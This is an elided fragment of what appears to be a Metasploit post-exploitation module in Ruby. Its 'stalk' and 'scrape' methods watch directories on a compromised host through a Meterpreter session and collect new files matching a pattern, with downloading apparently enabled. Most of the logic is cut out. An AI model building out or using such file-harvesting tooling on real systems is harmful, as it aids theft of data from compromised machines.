...
# include Msf::Post::File
  ...
  def stalk(paths)
    ...
    if datastore['DURATION'] != 0
      ...
      while ( !trapped && ((Time.new - start) < datastore['DURATION'] || datastore['DURATION'] == -1) )
        begin
          @delta += scrape(@paths)
          select(nil, nil, nil, @delay) # TODO update this to modern delay
        rescue Rex::Post::Meterpreter::RequestError
          # Handle directories that do not exist
        end
        # reset depths
  ...
  def scrape(dirs = [], download = true)
    # dirs is an array and should ideally be a full paths
    ...
    dirs.each do |adir|
      ...
      files.each do |f|
        ...
        if @current_depth < @depth && session.fs.filestat.new(fullname).directory?
          dirs_to_recurse << fullname
        elsif @pattern.match(f) && !@initial.include?(fullname) && !@delta.include?(fullname)
